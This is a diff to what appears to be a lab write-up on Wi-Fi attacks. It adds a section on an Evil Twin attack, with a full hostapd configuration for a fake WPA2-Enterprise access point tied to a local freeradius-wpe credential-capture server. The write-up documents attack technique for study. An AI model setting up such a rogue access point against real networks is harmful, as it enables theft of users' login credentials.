@@ -199,3 +199,28 @@ This proactive monitoring ensures that unauthorized deauthentication attempts ar
 Reducing signal strength is another important, yet often overlooked, technique to limit exposure to potential attackers. 
 
 If the Wi-Fi signal extends too far beyond the intended coverage area—such as reaching outside office walls or into public spaces—it becomes easier for an attacker to launch deauthentication attacks from a distance without being physically present inside the building. By adjusting the transmission power of the access points to only cover the necessary areas, it is harder for attackers to interfere with the network while still providing full coverage to legitimate users.
+
+
+## Evil Twin Attack
+
+After having disconnected the client from the real AP, we conduct the Evil Twin Attack. It consists in spwaning a fake AP and waiting for the client to connect to it.
+We could have used the Kali Linux Tool Airgeddon that comprises all the things needed to perform the attack, but wanted to approach the matter at a lower level, so we ended up building the attack in the following way.
+
+To fake the AP we used **hostapd** with the configuration as shown here, in which we specify to use the freeradius-wpe server that we setup on kali (eap server = 0) and the ip would be the localhost (radius server auth=127.0.0.1)
+
+```bash
+interface=wlan0
+driver=nl80211
+ssid=TP-Link_Fake
+hw_mode=g
+channel=2
+wpa=2
+wpa_key_mgmt=WPA-EAP
+rsn_pairwise=CCMP
+ieee8021x=1
+eap_server=0
+eapol_version=2
+radius_server_auth=127.0.0.1
+radius_server_auth_port=1812
+radius_server_secret=testing123
+```
